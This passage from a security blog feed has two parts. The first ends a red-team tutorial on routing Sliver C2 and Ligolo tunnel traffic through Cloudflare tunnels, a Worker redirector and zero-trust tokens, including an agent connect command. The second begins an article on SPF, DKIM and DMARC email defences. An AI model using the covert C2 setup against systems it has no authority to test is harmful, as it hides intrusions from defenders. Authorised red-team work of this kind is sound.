&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image14.png&#34; title=&#34;image14&#34; alt=&#34;image14&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image14&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;To then start the tunnels on your VM you run this command:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cloudflared tunnel run --token YourTokenHere&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Right, just taking us back to our overview diagram to view our progress, we have now completed the area in red, so we are halfway there. Good job.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image17.png&#34; title=&#34;image17&#34; alt=&#34;image17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;As it stands you can now send data into your tunnels quite easily, the problem is, that so can anyone else. As covert red teams that is not a good look, so we need to add some protection to the tunnels. This is where the workhorse of the setup comes into play via the Cloudflare worker.&lt;/p&gt;
&lt;p&gt;The Cloudflare worker comes with its own Cloudflare URL, normally something like customworkername.customsubdomain.workers.dev but it can also be a domain of your choosing. We have kept it as the well-known Cloudflare workers.dev prefix for demonstration purposes. The worker is essentially serverless code, which is constantly receiving requests and, in our case, redirecting those requests to where we want them to go.&lt;/p&gt;
&lt;p&gt;To create our worker some tools are required, and some code needs to be deployed but this doesn’t necessarily need to be carried out on your cloud VM and can be carried out from your local Linux system that has access to your Cloudflare account.&lt;/p&gt;
&lt;p&gt;Firstly, if you don’t have it installed, install the npm package like so which provides access to the npx command:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;sudo apt install npm&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Following this, checkout out the demo Cloudflare worker we have provided on our Github repo that will contain a ‘src’ folder which has an index.js file (which is the code the Worker uses to run) and it will also contain a wrangler.toml file which contains the variables the Worker references:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/CloudflareRedirector&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/CloudflareRedirector&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Now cd into the ‘CloudflareRedirector folder and run this command to install the wrangler files required to deploy the worker to Cloudflare.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;npm install wrangler --save-dev&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;A folder named node_modules and a file named package.json will also be created within our folder but we don’t need to be concerned with those.&lt;/p&gt;
&lt;p&gt;Next, we need to authenticate to the Cloudflare account we set up previously so issue this command and log into Cloudflare:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;npx wrangler login&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Finally open the wrangler.toml file in your text editor of choice and edit the fields outlined in red below including your accountid that we found at the beginning of this post. The URLs should match the tunnel URLs you have previously set up. The worker endpoint, customip, service variables, etc. can be readjusted after it has been deployed so you can leave them as-is.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The wrangler.toml file that provides variables to be used by the Cloudflare worker can be seen here. As mentioned the verbose subdomains and headers are used for demo purposes so adjust accordingly.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image16.png&#34; title=&#34;image16&#34; alt=&#34;image16&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image16&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;With all of this data populated we can now deploy the Worker to Cloudflare with:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;npx wrangler deploy&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now when we go back to Cloudflare and go to the &amp;lsquo;Workers &amp;amp; Pages&amp;rsquo; section we should see our new Worker named ‘redirector’ as shown:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image20.png&#34; title=&#34;image20&#34; alt=&#34;image20&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image20&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;When you go to the ‘Settings’ tab of the worker and view the variables you can see whatever data you have just deployed across to Cloudflare. You can edit these in the gui as shown, although another deployment will overwrite these, so if many deployments are expected you are better off making the changes in the wrangler.toml file and redeploying.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image18.png&#34; title=&#34;image18&#34; alt=&#34;image18&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image18&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;You can also click ‘Edit Code’ which will display the code used by the worker which is essentially the index.js file from the src folder we checked out from the repo. Below is just a snippet of the beginning of that file:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image19.png&#34; title=&#34;image19&#34; alt=&#34;image19&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image19&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;At this point it’s probably worth taking some time to explain how the worker code that we deployed operates. Essentially, we specify some constants at the beginning which we will use to look for header data within the incoming http requests. We also specify our custom constants to store the values we manually entered via our wrangler.toml such as SLIVER_HEADER which had the value MY-SLIVER.&lt;/p&gt;
&lt;p&gt;Now when a request comes in, the worker checks via multiple ‘if’ statements if the incoming header value is equal to for example the ‘SLIVER_HEADER_’_ text of ‘MY-SLIVER_’._ If it matches, we create a new request and send it to the sliverUrl which is linked to our custom SLIVERENDPOINT which should be linked to the URL of the Sliver tunnel.&lt;/p&gt;
&lt;p&gt;The code continues on like this with other ‘if’ checks, such as this one below redirecting our requests to our file server. In the scenario that the http request doesn’t have a custom header that we are expecting the code then checks if the IP is an IP we may want to allow into our internal file server. We then redirect that to a tunnel which points to our internal http server. This IP can be set under CUSTOM_IP in the wrangler.toml or via the Cloudflare website.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image4.png&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;So, in our case we may have a custom header for multiple C2’s running on our VM or a Ligolo server. Keep in mind though, to use Ligolo over Cloudflare websockets you will need this fork of ligolo-ng:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/virusvfv/ligolo-ng/tree/Websockets&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/virusvfv/ligolo-ng/tree/Websockets&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Anyhow, you may also have noticed that two new header values (‘CF-Access-Client-Id’ and ‘CF-Access-Client-Secret’) are also added to the new request via the code but I will come to that in a moment.&lt;/p&gt;
&lt;p&gt;Now that your worker is deployed you can view its URL in the ‘Triggers’ area of the Worker’s ‘Settings’ area as shown below. Here you can set a custom domain or take the one provided by Cloudflare.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image21.png&#34; title=&#34;image21&#34; alt=&#34;image21&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image21&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;When you have decided which URL to use please go back and edit the variable ‘WORKER_ENDPOINT’ in your wrangler.toml and redeploy it or via the Cloudflare gui which will automatically redeploy the worker.&lt;/p&gt;
&lt;p&gt;It’s also worth pointing out the logging features of the redirector should there be any issues with the requests coming in. You can click ‘Begin log stream’ under ‘Logs’ which will allow you to see all the requests entering the worker. There is also logging on the tunnels should you want to see the requests entering those too. We feel that some of the drawbacks in regards to lack of visibility for debugging that previously existed in regards Cloudflare or other domain fronted setups have now been mitigated with all of these excellent logging capabilities.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image22.png&#34; title=&#34;image22&#34; alt=&#34;image22&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image22&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Just taking another step back, this is how far we have come now with only the final piece of the jigsaw in red left to complete.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image23.png&#34; title=&#34;image23&#34; alt=&#34;image23&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image23&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;We now have a Worker that can receive custom http requests and we have tunnels that will take the requests and tunnel them into our Cloud VM infrastructure. The last issue we have is that although we now have a Worker carrying data to our tunnels, the tunnel URLs are still accessible to the outside world so our Worker can be bypassed.&lt;/p&gt;
&lt;p&gt;To rectify this, we need to add a ‘Zero Trust’ check to the tunnel ‘entrances’, and we do this by placing Cloudflare applications as the entry point to them. These can also have preconditions to entry attached to them called ‘Policies’. This is easier to explain with some further screenshots.&lt;/p&gt;
&lt;p&gt;We must first create a ‘Service token’ which is used by automated systems like Workers to authenticate against our zero trust policies. In the Cloudflare zero trust area we go to ‘Access’ then ‘Service Auth’ and click ‘Create Service Token’ and provide a name and duration.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image24.png&#34; title=&#34;image24&#34; alt=&#34;image24&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image24&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This will generate us a token that can be used by your Worker to access the ‘Zero Trust’ area where our tunnels are located. The token will only be visible at this point so please note down both the ‘CF-Access-Client-Id’ and ‘CF-Access-Client-Secret’ fields and populate them in your wrangler.toml file and redeploy that or manually add them into the variables area of your Worker.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image25.png&#34; title=&#34;image25&#34; alt=&#34;image25&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image25&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Now our Worker has the ability to use a token to enter Cloudflare’s zero trust tunnels, but we still need to add the checks for this token ID on the tunnels themselves.&lt;/p&gt;
&lt;p&gt;To do this we create 3 apps pointing to our 3 tunnel URLs as follows. Click ‘Add an application’ and choose ‘Self-hosted’:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image26.png&#34; title=&#34;image26&#34; alt=&#34;image26&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image26&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Choose a name and the tunnel the app is meant to be linked to. So, if your tunnel is sliver.mydomain.com add those details in the redacted areas below.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image27.png&#34; title=&#34;image27&#34; alt=&#34;image27&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image27&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Next up we choose what Policies will be used to allow or deny data into the tunnel via the application. Here we choose our Service-Auth access we set up previously so only requests that have those two header values of ‘CF-Access-Client-Id’ and ‘CF-Access-Client-Secret’ will be allowed access i.e. only data via our clever Worker which now adds those two headers automatically can enter. An easy mistake to make here is to not choose ‘Service Auth’ under the ‘Action’ dropdown so make sure that is chosen.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The Policy’s remaining settings can remain as they are when you are creating Policies for Ligolo or for a C2 so create two apps exactly as per above if only using a C2 and Ligolo. For access to files, it is useful to add a second bypass policy and I will explain why now.&lt;/p&gt;
&lt;p&gt;If you create another app called ‘Files’ to allow access into your remote file server, we can restrict requests entering from only a specific IP, but we can also allow privileged users directly into the files tunnel who have a specific email address outside of that IP. This is for the occasions when a team may want to access their remote VM files but don’t want to keep adding multiple custom IPs to the Worker or don’t need command line access via wget, certutil etc.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;To do this add another policy called ‘Email’ and add an ‘Include’ email selector at the bottom and enter a specific email address or if you are working in a team you may want to allow all email addresses that end in mycompany.com for example.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image3.png&#34; title=&#34;image3&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image3&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;What happens then is, when you visit the files tunnel URL directly (&lt;a href=&#34;https://files.yourdomain.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://files.yourdomain.com&lt;/a&gt;) therefore bypassing the IP checks of the Worker redirector you can still access it and you will be presented with this webpage as shown:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;You can then enter your email address of &lt;a href=&#34;mailto:john.doe@mycompany.com&#34; &gt;john.doe@mycompany.com&lt;/a&gt; and if the email is valid as per the Policy, you will be emailed a code to get access through the tunnel.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;You can then access your files like this via the browser for example which is quite useful.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;At the end of this config process, you should now have a bunch of applications pointing to your tunnels as shown, kinda acting like gatekeepers to them via Policies, hence the zero-trust aspect:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image8.png&#34; title=&#34;image8&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image8&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;So, if you are still with me that is now all we need to access our cloud infrastructure via Cloudflare. Just to summarise, this is now how it all becomes operational:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;We update Cloudflare as I have shown to expect our custom header values.&lt;/li&gt;
&lt;li&gt;We update Cloudflare to expect a custom IP should we want to grab files from a specific IP.&lt;/li&gt;
&lt;li&gt;We can generate a C2\Ligolo agent with a custom header. Therefore, with the branched websockets version of Ligolo-ng as an example you can do the following:&lt;code&gt;ligolosockets.exe -connect https://redirector.myname.workers.dev:443 -ua MY-LIGOLO&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;We send all of our requests to the Worker redirector URL and not to the tunnels directly as the Worker will add the zero trust header values required to enter the tunnels. Accessing them directly will no longer work except for the email login to our file server.&lt;/li&gt;
&lt;li&gt;The worker passes the request to the app sitting in front of the tunnels which then checks for the service auth token to make sure it matches.&lt;/li&gt;
&lt;li&gt;If the service auth token matches, the request is directed to that specific tunnel. This then flows into the internal URL of our Cloud VM (which is specified in the tunnel config) to provide us with our connectivity.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The above Cloudflare configuration coupled with Azure snapshots and Tmux Resurrect make for a really nice combination in regards swiftly bringing up your red team infrastructure. We hope that you found this useful, and we feel that it is worth trying this setup out for yourself and your team if you want to speed up your infrastructure creation.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Bullet Proofing Your Email Gateway</title>
      <link>//localhost:1313/articles/2024/06/2024-06-19-bullet-proofing-your-email-gateway/</link>
      <pubDate>Wed, 19 Jun 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/06/2024-06-19-bullet-proofing-your-email-gateway/</guid>
      <description>
        
        
        &lt;p&gt;In this labs post, I will introduce you to modern security controls that are currently used (but not always correctly) by the vast majority of enterprises, and hopefully by the end of this write-up, the topic will become a little clearer and the concepts will become easier to grasp.&lt;/p&gt;
&lt;p&gt;In today’s world of spammers, intruders, and fake emails, having a robust setup for your email deliveries is crucial. Email security is a constant challenge, with businesses and individuals facing an increasing number of virus-infected emails and phishing scams daily. Protecting systems and sensitive data requires vigilance and continuous effort.&lt;/p&gt;
&lt;p&gt;According to Zscaler’s latest annual phishing report, the past year saw a 58% increase in phishing attacks (&lt;em&gt;&lt;a href=&#34;https://www.zscaler.com/blogs/security-research/phishing-attacks-rise-58-year-ai-threatlabz-2024-phishing-report&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.zscaler.com/blogs/security-research/phishing-attacks-rise-58-year-ai-threatlabz-2024-phishing-report&lt;/a&gt;&lt;/em&gt;). This rise highlights the growing need for effective email security measures to ensure that malicious emails do not end up in our corporate or personal inboxes.&lt;/p&gt;
&lt;p&gt;A significant advancement is the availability of enhanced security options designed to shield us from harmful emails. These innovative methods significantly enhance the safety of email interactions. What’s more, these improved security measures are effective regardless of whether you’re sending or receiving emails. By adopting these new approaches, we can substantially minimise the risks associated with email-related threats, thereby fostering a safer experience for all parties involved.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Sender Policy Framework (SPF)&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;sender-policy-framework-spf&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#sender-policy-framework-spf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;It’s an email authentication protocol designed to assist mail servers in identifying and thwarting spam, phishing, and spoofing attempts. This mechanism relies on DNS records to publish a roster of authorised mail servers and validate the origins of emails.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;                    
                    &amp;#43;-------------------------&amp;#43;
                    | Mail Sender&amp;#39;s Domain    |
                    | (e.g., example.com)     |
                    &amp;#43;-------------------------&amp;#43;
                               |
                               | Sends Email
                               v
                    &amp;#43;-------------------------&amp;#43;
                    | Recipient&amp;#39;s Mail Server |
                    &amp;#43;-------------------------&amp;#43;
                               |
                               | Queries DNS for SPF Record
                               v
                    &amp;#43;-------------------------&amp;#43;
                    | DNS Server              |
                    &amp;#43;-------------------------&amp;#43;
                               |
                               | Returns SPF Record
                               v
                    &amp;#43;-------------------------&amp;#43;
                    | Recipient&amp;#39;s Mail Server |
                    &amp;#43;-------------------------&amp;#43;
                               |
           &amp;#43;---------------------------------------&amp;#43;
           |                                       |
   Compares IP Address                      Action Based on
   with SPF Record                          SPF Verification
           |                                       |
           |                                       |
           v                                       v
    &amp;#43;--------------&amp;#43;                       &amp;#43;----------------&amp;#43;
    | Match Found  |                       | No Match Found |
    &amp;#43;--------------&amp;#43;                       &amp;#43;----------------&amp;#43;
           |                                       |
           v                                       v
   Accepts Email                           Rejects/Quarantines/
                                            Marks Email as Spam&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Here’s how it works: When an email is dispatched from domain A, the mail server of domain B scrutinises domain A’s SPF record. If no SPF record is found for domain A, it signifies that the mail server isn’t an authorised sender. Consequently, the email fails the SPF check and is either flagged as spam or rejected outright.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;1&#34; alt=&#34;1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In the provided example, the SPF record includes the version of SPF being utilised and lists Outlook mail servers. Additionally, it employs the “-all” flag, indicating a strict policy where any mail server not explicitly listed in the SPF record will fail the check. Conversely, “~all” signifies a softer policy where failures are treated less strictly.&lt;/p&gt;
&lt;p&gt;One limitation of SPF is its restricted scope of protection. It solely verifies the sender’s IP address against the domain’s SPF record, leaving a vulnerability against spoofing of the &lt;code&gt;From:&lt;/code&gt; email header, a common tactic used to deceive recipients.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Domain Keys Identified Mail (DKIM)&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;domain-keys-identified-mail-dkim&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#domain-keys-identified-mail-dkim&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This email authentication protocol is designed to detect forged sender addresses by enabling receivers to verify if an email is legitimately sent from a specified domain. It introduces a unique domain name identifier to emails, distinct from other identifiers, and secures it through encryption using public and private keys. The public key is shared as part of the DNS record to verify the email signature and is stored on the sender’s email server, while the private key resides on the sender’s computer and is used to generate a unique digital signature for each outgoing email. This signature, essentially a hash value derived from the email’s content and headers, is encrypted with the private key and included in the email header.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1;
 h=from:to:subject:date:message-id;
 bh=47DEQpj8HBSa&amp;#43;/TImW&amp;#43;5JCeuQeRkm5NMpJWZG3hSuFU=;
 b=abc123...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;The DKIM header provides essential information including the DKIM version being utilized, the signing algorithm employed, the domain of the entity that signed the email, the selector used to locate the public key in DNS, and a list of headers included in the signature, along with the body hash and signature data.&lt;/p&gt;
&lt;p&gt;In essence, DKIM serves to verify that the email content has not been tampered with during transit and that it originates from an authorised mail server for the specified domain.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Domain-Based Message Authentication Reporting and Conformance (DMARC)&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;domain-based-message-authentication-reporting-and-conformance-dmarc&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#domain-based-message-authentication-reporting-and-conformance-dmarc&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This mechanism serves as an authentication layer, providing an additional level of security beyond SPF and DKIM. It introduces an extra policy alignment layer and reporting mechanism.&lt;/p&gt;
&lt;p&gt;The policy enables specification of how to handle emails that fail SPF and DKIM checks—options include none, quarantine, or reject. When both SPF and DKIM checks pass, it confirms the legitimacy of the email, verifying that it originates from an approved server and that header information remains unaltered. For SPF alignment, the domains specified in the &lt;code&gt;From:&lt;/code&gt; header and Return-Path must match.&lt;/p&gt;
&lt;p&gt;For DKIM, the domains specified in the &lt;code&gt;From:&lt;/code&gt; and &lt;code&gt;d=&lt;/code&gt; fields must align.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;v=DMARC1; p=reject; rua=mailto:dmarc-reports@example.com; 
ruf=mailto:dmarc-forensics@example.com; fo=1; adkim=s; aspf=s;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Above is the example DMARC record can be found as TXT record in DNS of a domain.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=&lt;/code&gt; specifies DMARC version &lt;code&gt;p=&lt;/code&gt; specifies policy that handles emails that are failing authentication (either none, quarantine, or reject) &lt;code&gt;rua=&lt;/code&gt; is an address to send aggregate reports &lt;code&gt;ruf=&lt;/code&gt; address to send forensic reports &lt;code&gt;fo=1&lt;/code&gt; specifies format of forensic reports &lt;code&gt;adkim=s&lt;/code&gt; specifies alignment mode for DKIM (where s = strict and r = relaxed), &lt;code&gt;aspf=s&lt;/code&gt; specifies alignment mode for SPF (s = strict and r=relaxed)&lt;/p&gt;
&lt;p&gt;Configuring DMARC can be challenging, but there is a valuable resource available at &lt;a href=&#34;https://dmarc.org/2016/07/common-problems-with-dmarc-records/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://dmarc.org/2016/07/common-problems-with-dmarc-records/&lt;/a&gt; that comprehensively addresses common issues encountered during the implementation of this protocol.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Bolstering Email Security - O365 example&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;bolstering-email-security---o365-example&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#bolstering-email-security---o365-example&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;By default, in our Microsoft 365 tenants, the SPF record is automatically configured during tenant creation, alleviating concerns about it for the time being. Our focus now shifts to setting up the DKIM record, especially in scenarios where we manage our own domain DNS. To verify the SPF record, you can use the following command:&lt;/p&gt;
&lt;p&gt;❯ &lt;code&gt;dig acmeldn.onmicrosoft.com txt&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;;; ANSWER SECTION:

acmeldn.onmicrosoft.com. 3508   IN      TXT     &amp;#34;v=spf1 include:spf.protection.outlook.com -all&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;To set up DKIM, we first need to check for our domainGUID. This can be done by using the dig command to check for the existing domainGUID.&lt;/p&gt;
&lt;p&gt;❯ &lt;code&gt;dig acmeldn.onmicrosoft.com mx&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
